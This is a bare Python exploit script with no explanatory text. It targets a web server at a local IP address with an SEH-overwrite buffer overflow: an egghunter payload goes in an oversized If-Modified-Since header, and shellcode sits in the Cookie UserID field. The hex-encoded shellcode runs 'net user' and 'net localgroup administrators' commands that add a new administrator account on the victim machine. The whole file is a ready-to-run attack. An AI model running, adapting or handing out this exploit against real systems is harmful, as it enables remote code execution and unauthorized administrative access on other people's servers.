#!/usr/bin/python

import os,struct,sys,socket

host = '192.168.1.28'
port = 80


shellcode = ("W00TW00T"
"\x31\xc0"
"\x50"
"\x68\x2f\x61\x64\x64"
"\x68\x62\x65\x6c\x20"
"\x68\x73\x20\x72\x6f"
"\x68\x61\x74\x6f\x72"
"\x68\x69\x73\x74\x72"
"\x68\x64\x6d\x69\x6e"
"\x68\x75\x70\x20\x61"
"\x68\x6c\x67\x72\x6f"
"\x68\x6c\x6f\x63\x61"
"\x68\x6e\x65\x74\x20"
"\x68\x64\x20\x26\x20"
"\x68\x20\x2f\x61\x64"
"\x68\x6f\x62\x65\x6c"
"\x68\x65\x6c\x20\x72"
"\x68\x20\x72\x6f\x62"
"\x68\x75\x73\x65\x72"
"\x68\x6e\x65\x74\x20"
"\x89\xE0"
"\x6A\x01"
"\x50"
"\xBB\x77\xb1\xb8\x77" # Must be changed in order to match system() address. (Note** Will not work with ASLR)
"\xFF\xD3")

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

nseh = '\xeb\xde\x90\x90'
seh = "\x52\x37\x42"

payload = 'A' * (192 - len(nseh + egghunter))
payload += egghunter
payload += nseh
payload += seh # 00423752

request = (
"GET / HTTP/1.1\r\n"
"Host: 192.168.1.28\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Connection: close\r\n"
"Cookie: UserID="+shellcode+"; PassWD=; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
"Upgrade-Insecure-Requests: 1\r\n"
"If-Modified-Since: Fri, " + payload + "\r\n\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(request)
sock.close()